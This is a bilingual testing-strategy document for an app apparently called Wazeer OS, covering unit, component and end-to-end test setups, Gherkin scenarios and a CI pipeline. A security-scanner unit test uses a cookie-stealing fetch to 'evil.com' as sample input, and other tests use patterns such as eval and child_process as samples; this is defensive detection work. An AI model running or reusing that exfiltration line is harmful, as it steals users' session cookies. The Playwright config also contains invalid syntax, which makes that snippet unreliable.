# 12 — Testing Strategy / استراتيجية الاختبار

> Wazeer OS / وزير OS v2.0.0-Rewrite | 𓂀 Amoun / أمون
> Author: 100MillionDEV / العرآب
> Principle: Quality is not a phase — it is woven into every line

---

## 1. Testing Pyramid / هرم الاختبار

```
                    ┌──────────┐
                    │   E2E    │  Playwright — 10% of tests
                    │  (Slow)  │  Critical user journeys
                   ┌┴──────────┴┐
                   │ Component  │  React Testing Library — 25% of tests
                   │  (Medium)  │  UI behavior, accessibility
                  ┌┴────────────┴┐
                  │   Unit       │  Vitest — 65% of tests
                  │  (Fast)      │  Pure functions, stores, utilities
                 ┌┴──────────────┴┐
                 │  Static       │  TypeScript + ESLint — Always on
                 │  Analysis     │  Type checking, linting
                 └───────────────┘
```

### Coverage Targets

| Layer | Tool | Minimum Coverage | Enforcement |
|-------|------|-----------------|--------------|
| Unit | Vitest | **>80%** | CI fails below threshold |
| Component | React Testing Library | **>70%** | CI fails below threshold |
| E2E | Playwright | Critical paths only | CI blocks deploy on failure |
| Security AST | Vitest + custom assertions | **100%** of HorusGuard patterns | No exceptions |
| Lighthouse | Chrome DevTools | **>90** all categories | Manual gate before release |

---

## 2. Unit Testing — Vitest

### Configuration

```typescript
// vitest.config.ts
import { defineConfig } from 'vitest/config';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  test: {
    globals: true,
    environment: 'jsdom',
    setupFiles: ['./src/test/setup.ts'],
    coverage: {
      provider: 'v8',
      reporter: ['text', 'json', 'html', 'lcov'],
      include: ['src/lib/**', 'src/stores/**', 'src/utils/**'],
      exclude: ['src/test/**', 'src/**/*.d.ts', 'src/mocks/**'],
      thresholds: {
        lines: 80,
        functions: 80,
        branches: 75,
        statements: 80,
      },
    },
  },
});
```

### What Gets Unit Tested

| Module | Test Focus | Mock Strategy |
|--------|-----------|---------------|
| `AIGateway` | Request routing, provider selection, failover | Mock fetch, mock adapters |
| `HorusGuard` | Pattern detection, severity classification | Pure AST inputs |
| `PromptSanitizer` | Key/token/password redaction | String inputs |
| `TaskScheduler` | Priority sorting, time-based execution | Mock Date, mock DB |
| `LearningEngine` | Pattern extraction, weight updates | Mock DB reads/writes |
| `MemoryEngine` | Store/retrieve/delete memories | Mock IndexedDB |
| `Excommunicado` | IP ban/unban, list management | Mock DB |
| Zustand stores | State transitions, persistence | Mock idb-keyval |
| Utility functions | SHA-256 hashing, date formatting | None (pure) |

### Example: HorusGuard Unit Test

```typescript
// src/lib/security/__tests__/horusguard.test.ts
import { describe, it, expect } from 'vitest';
import { scanAST, Severity } from '../horusguard';

describe('HorusGuard AST Scanner', () => {
  it('detects eval() calls as Critical', () => {
    const code = 'const result = eval(userInput);';
    const findings = scanAST(code);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.Critical);
    expect(findings[0].pattern).toBe('eval');
  });

  it('detects innerHTML assignment as Critical', () => {
    const code = 'document.getElementById("app").innerHTML = response;';
    const findings = scanAST(code);
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe(Severity.Critical);
    expect(findings[0].pattern).toBe('innerHTML');
  });

  it('detects fetch with http:// as High', () => {
    const code = 'fetch("http://evil.com/steal?data=" + document.cookie);';
    const findings = scanAST(code);
    expect(findings.length).toBeGreaterThanOrEqual(2);
    const fetchFinding = findings.find(f => f.pattern === 'fetch_http');
    expect(fetchFinding?.severity).toBe(Severity.High);
  });

  it('allows safe code with no findings', () => {
    const code = 'const x = 42; console.log(x); return x * 2;';
    const findings = scanAST(code);
    expect(findings).toHaveLength(0);
  });

  it('detects require(child_process) as Critical', () => {
    const code = 'const { exec } = require("child_process");';
    const findings = scanAST(code);
    expect(findings).toHaveLength(1);
    expect(findings[0].pattern).toBe('require_child_process');
  });
});
```

### Example: AIGateway Unit Test

```typescript
// src/lib/ai/__tests__/gateway.test.ts
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { AIGateway } from '../gateway';
import { MockGeminiAdapter } from '../../test/mocks/gemini-adapter';

describe('AIGateway v2.0', () => {
  let gateway: AIGateway;

  beforeEach(() => {
    gateway = new AIGateway({
      adapters: { gemini: new MockGeminiAdapter() },
      defaultProvider: 'gemini',
    });
  });

  it('routes request to configured provider', async () => {
    const result = await gateway.generate({
      provider: 'gemini',
      model: 'gemini-2.5-flash',
      prompt: 'مرحبا',
    });
    expect(result.text).toBeTruthy();
  });

  it('falls back to next provider on failure', async () => {
    const failingAdapter = new MockGeminiAdapter({ shouldFail: true });
    const fallbackAdapter = new MockGeminiAdapter();
    gateway.registerAdapter('claude', fallbackAdapter);
    gateway.registerAdapter('gemini', failingAdapter);

    const result = await gateway.generate({
      provider: 'gemini',
      model: 'gemini-2.5-flash',
      prompt: 'test',
      fallbackProviders: ['claude'],
    });
    expect(result.text).toBeTruthy();
    expect(result.usedProvider).toBe('claude');
  });
});
```

---

## 3. Component Testing — React Testing Library

### Configuration

```typescript
// src/test/setup.ts
import '@testing-library/jest-dom/vitest';
import { cleanup } from '@testing-library/react';
import { afterEach, vi } from 'vitest';

// Mock IndexedDB globally
import 'fake-indexeddb/auto';

// Mock Web Crypto API for SHA-256 tests
Object.defineProperty(globalThis, 'crypto', {
  value: {
    subtle: {
      digest: vi.fn().mockResolvedValue(new ArrayBuffer(32)),
    },
    getRandomValues: vi.fn((arr) => {
      for (let i = 0; i < arr.length; i++) arr[i] = Math.floor(Math.random() * 256);
      return arr;
    }),
  },
});

afterEach(() => {
  cleanup();
});
```

### What Gets Component Tested

| Component | Test Focus | Key Assertions |
|-----------|-----------|----------------|
| `ChatInput` | Send button disabled when empty, RTL text rendering | `toBeDisabled()`, `toHaveTextContent()` |
| `MessageBubble` | User vs agent styling, code block rendering, Arabic text | `toHaveClass()`, `toBeInTheDocument()` |
| `AgentCard` | Dashboard card renders agent name, status, task count | `getByText()`, `getByRole()` |
| `TaskForm` | 4-field form validation, priority selection | `toHaveFormValues()`, `toBeInvalid()` |
| `SettingsPanel` | Theme toggle, language switch, LLM key input | `toHaveValue()`, userEvent interactions |
| `SearchResults` | Grounding sources display, citation links | `getAllByRole('link')` |
| `AuthProvider` | Login/logout flow, loading states, error display | `waitFor()`, `findByRole()` |

### Example: TaskForm Component Test

```typescript
// src/components/tasks/__tests__/TaskForm.test.tsx
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, it, expect, vi } from 'vitest';
import { TaskForm } from '../TaskForm';

describe('TaskForm — 4-Field Model', () => {
  it('renders all 4 fields', () => {
    render(<TaskForm onSubmit={vi.fn()} />);
    expect(screen.getByLabelText(/العنوان/i)).toBeInTheDocument();
    expect(screen.getByLabelText(/الوصف/i)).toBeInTheDocument();
    expect(screen.getByLabelText(/الأولوية/i)).toBeInTheDocument();
    expect(screen.getByLabelText(/الجدولة/i)).toBeInTheDocument();
  });

  it('validates required fields before submit', async () => {
    const onSubmit = vi.fn();
    render(<TaskForm onSubmit={onSubmit} />);
    fireEvent.click(screen.getByRole('button', { name: /إضافة/i }));
    expect(onSubmit).not.toHaveBeenCalled();
    expect(screen.getByText(/العنوان مطلوب/i)).toBeInTheDocument();
  });

  it('submits with all 4 fields populated', async () => {
    const user = userEvent.setup();
    const onSubmit = vi.fn();
    render(<TaskForm onSubmit={onSubmit} />);

    await user.type(screen.getByLabelText(/العنوان/i), 'تحليل البيانات');
    await user.type(screen.getByLabelText(/الوصف/i), 'تحليل مبيعات الربع الأول');
    await user.selectOptions(screen.getByLabelText(/الأولوية/i), 'high');
    await user.type(screen.getByLabelText(/الجدولة/i), '2025-03-01T09:00');

    fireEvent.click(screen.getByRole('button', { name: /إضافة/i }));
    expect(onSubmit).toHaveBeenCalledWith({
      title: 'تحليل البيانات',
      description: 'تحليل مبيعات الربع الأول',
      priority: 'high',
      scheduledFor: '2025-03-01T09:00',
    });
  });
});
```

---

## 4. E2E Testing — Playwright

### Configuration

```typescript
// playwright.config.ts
import { defineConfig, devices } from '@playwright/test';

export default defineConfig({
  testDir: './e2e',
  fullyParallel: true,
  forbidOnly: !!process.env.CI,
  retries: process.env.CI ? 2 : 0,
  workers: process.env.CI ? 1 : undefined,
  reporter: [['html', { open: 'never' }], ['github' if process.env.CI ? 'github' : 'list']],
  use: {
    baseURL: 'http://localhost:5173',
    trace: 'on-first-retry',
    screenshot: 'only-on-failure',
    video: 'retain-on-failure',
  },
  projects: [
    { name: 'Chrome', use: { ...devices['Desktop Chrome'] } },
    { name: 'Mobile Chrome', use: { ...devices['Pixel 5'] } },
  ],
  webServer: {
    command: 'npm run dev',
    port: 5173,
    reuseExistingServer: !process.env.CI,
  },
});
```

---

## 5. Gherkin Test Cases / حالات الاختبار

### Feature: User Authentication / مصادقة المستخدم

```gherkin
Feature: Firebase Authentication
  كـ مستخدم
  أريد تسجيل الدخول بأمان
  لكي أصل إلى وكيلي الذكي

  Scenario: Successful login with email and password
    Given the user is on the login page
    And the user has a valid Firebase account
    When the user enters their email "user@example.com"
    And the user enters their password
    And the user clicks "تسجيل الدخول"
    Then the user should be redirected to the dashboard
    And the auth_logs store should contain a login event

  Scenario: Login with invalid credentials shows error
    Given the user is on the login page
    When the user enters email "wrong@example.com"
    And the user enters password "wrongpass"
    And the user clicks "تسجيل الدخول"
    Then an error message should be displayed in Arabic
    And the user should remain on the login page

  Scenario: Google OAuth login
    Given the user is on the login page
    When the user clicks "تسجيل بـ Google"
    And the OAuth popup completes successfully
    Then the user should be redirected to the dashboard
```

### Feature: AI Chat / المحادثة الذكية

```gherkin
Feature: AI Chat via AIGateway
  كـ مستخدم
  أريد إرسال رسائل للوكيل الذكي
  لكي أحصل على إجابات ذكية

  Scenario: Send message and receive streaming response
    Given the user is logged in
    And the user has configured a Gemini API key
    When the user types "ما هو وزير OS؟" in the chat input
    And the user presses Enter
    Then the message should appear in the chat
    And a streaming response should begin within 2 seconds
    And the response should contain text

  Scenario: Message with code block gets HorusGuard scanned
    Given the user is logged in
    When the AI returns a code block containing "eval(userInput)"
    Then HorusGuard should flag the code as Critical
    And the code block should not be rendered
    And a warning message should be displayed

  Scenario: Search query triggers Gemini Grounding
    Given the user is logged in
    And the user has a Gemini API key configured
    When the user types "أخبار مصر اليوم" in the chat
    And the AI determines a search is needed
    Then the response should include grounding sources
    And each source should have a clickable URL
```

### Feature: Task Management / إدارة المهام

```gherkin
Feature: 4-Field Task Model
  كـ مستخدم
  أريد إنشاء مهام ذات أولوية
  لكي ينظم الوكيل الذكي عمله

  Scenario: Create a task with all 4 fields
    Given the user is on the task creation form
    When the user fills in title "تحليل السوق"
    And the user fills in description "تحليل سوق العمل المصري 2025"
    And the user selects priority "high"
    And the user sets scheduled date to "2025-03-01T09:00:00Z"
    And the user clicks "حفظ"
    Then the task should appear in the task list
    And the task should show priority badge "عالية"

  Scenario: TaskScheduler executes scheduled task
    Given a task exists with scheduledFor in the past
    And the task priority is "critical"
    When the TaskScheduler runs its tick
    Then the task should be dispatched to the AI agent
    And the task status should change to "in_progress"
```

### Feature: Security / الأمان

```gherkin
Feature: HorusGuard AST Security
  كـ نظام أمان
  أريد فحص كل كود مُولّد
  لكي أمنع تنفيذ الكود الخبيث

  Scenario: Block eval execution
    Given the AI generates code containing "eval("
    When HorusGuard scans the code
    Then the code should be blocked
    And a Critical severity finding should be logged

  Scenario: Block innerHTML injection
    Given the AI generates code with "element.innerHTML = payload"
    When HorusGuard scans the code
    Then the code should be blocked

  Scenario: Allow safe DOM manipulation
    Given the AI generates code using "textContent"
    When HorusGuard scans the code
    Then the code should be allowed
    And zero findings should be returned

  Scenario: Prompt sanitizer redacts API keys
    Given the user types a prompt containing "sk-abc123def456"
    When the prompt sanitizer processes the input
    Then the API key should be replaced with "[REDACTED_KEY]"
    And the sanitized prompt should be stored in logs
```

### Feature: Memory / الذاكرة

```gherkin
Feature: MemoryEngine
  كـ مستخدم
  أريد أن يتذكر الوكيل معلوماتي
  لكي يقدم تجربة شخصية

  Scenario: Store and retrieve a memory
    Given the user tells the agent "اسمي أحمد وأعمل مهندس"
    When the MemoryEngine processes this message
    Then a memory should be stored with key "user_name" value "أحمد"
    And a memory should be stored with key "user_job" value "مهندس"

  Scenario: Memory persists across sessions
    Given memories exist in the userMemory IndexedDB store
    When the user closes and reopens the app
    Then the MemoryEngine should load existing memories
    And the agent should reference stored memories in conversation
```

---

## 6. Mock Strategies / استراتيجيات المحاكاة

| Target | Strategy | Tool | Location |
|--------|----------|------|----------|
| LLM APIs | Mock adapter implementing `ProviderAdapter` | Vitest `vi.fn()` | `src/test/mocks/` |
| IndexedDB | `fake-indexeddb` auto-mock | `fake-indexeddb/auto` | `src/test/setup.ts` |
| Firebase Auth | Mock `firebase/auth` module | Vitest `vi.mock()` | `src/test/mocks/firebase.ts` |
| Web Crypto API | Mock `crypto.subtle.digest` | Vitest `vi.fn()` | `src/test/setup.ts` |
| Fetch API | Mock `global.fetch` | Vitest `vi.fn()` | Per-test file |
| Service Worker | Skip in test env | `navigator.serviceWorker` null | `src/test/setup.ts` |
| `idb-keyval` | In-memory Map fallback | Custom mock | `src/test/mocks/idb-keyval.ts` |

### Mock Adapter Pattern

```typescript
// src/test/mocks/base-adapter.ts
import type { ProviderAdapter, AIRequest, AIResponse } from '../../lib/ai/types';

export class MockAdapter implements ProviderAdapter {
  constructor(private options: {
    responseText?: string;
    shouldFail?: boolean;
    latencyMs?: number;
  } = {}) {}

  async generate(request: AIRequest): Promise<AIResponse> {
    if (this.options.latencyMs) {
      await new Promise(r => setTimeout(r, this.options.latencyMs));
    }
    if (this.options.shouldFail) {
      throw new Error('Mock provider failure');
    }
    return {
      text: this.options.responseText ?? 'Mock AI response',
      provider: 'mock',
      model: request.model,
      timestamp: Date.now(),
    };
  }

  async *stream(request: AIRequest): AsyncGenerator<string> {
    const words = (this.options.responseText ?? 'Mock streamed response').split(' ');
    for (const word of words) {
      yield word + ' ';
    }
  }
}
```

---

## 7. CI/CD Pipeline / خط أنابيب التكامل والتسليم

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   Push / PR  │───►│    Build     │───►│    Test      │───►│   Deploy     │
│              │    │              │    │              │    │   (main)    │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
                          │                   │                    │
                     ┌────┴────┐        ┌─────┴─────┐        ┌────┴────┐
                     │ Vite    │        │ Vitest    │        │ rsync   │
                     │ build   │        │ RTL       │        │ PM2     │
                     │ Lint    │        │ Playwright │        │ reload  │
                     │ Type    │        │ Lighthouse │        │         │
                     │ check   │        │           │        │         │
                     └─────────┘        └───────────┘        └─────────┘
```

### Pipeline Steps

| Step | Command | Fail Condition | Time Limit |
|------|---------|----------------|------------|
 1. Install | `npm ci` | Non-zero exit | 120s |
 2. Lint | `npm run lint` | Any warnings | 30s |
 3. Type Check | `npx tsc --noEmit` | Any errors | 30s |
 4. Unit Tests | `npx vitest run --coverage` | Coverage <80% | 60s |
 5. Component Tests | `npx vitest run --config vitest.component.config.ts` | Coverage <70% | 60s |
 6. Build | `npm run build` | Build error | 60s |
 7. E2E Tests | `npx playwright test` | Any failure | 180s |
 8. Lighthouse | `npx lighthouse <url> --output=json` | Score <90 | 60s |
 9. Deploy | `npm run deploy:production` | Deploy error | 120s |

---

## 8. Coverage Reporting / تقارير التغطية

Coverage reports are generated in CI and stored as artifacts:

```
coverage/
├── index.html           # Interactive HTML report
├── lcov.info            # For CI badge integration
├── coverage-final.json  # Machine-readable
└── src/
    ├── lib/
    │   ├── security/horusguard.ts    # Must be 100%
    │   ├── security/sanitizer.ts     # Must be 100%
    │   └── ai/gateway.ts             # Target 90%+
    └── stores/
        └── appStore.ts               # Target 85%+
```

### Coverage Badge (in README)

```
![Unit Coverage](https://img.shields.io/badge/unit_coverage-84%25-brightgreen)
![Component Coverage](https://img.shields.io/badge/component_coverage-76%25-yellow)
![Security Coverage](https://img.shields.io/badge/security_coverage-100%25-critical)
```

---

> 𓂀 *Testing is the Eye of Horus — it sees what we cannot. Every untested line is a blind spot in our armor.* — Wazeer OS Engineering
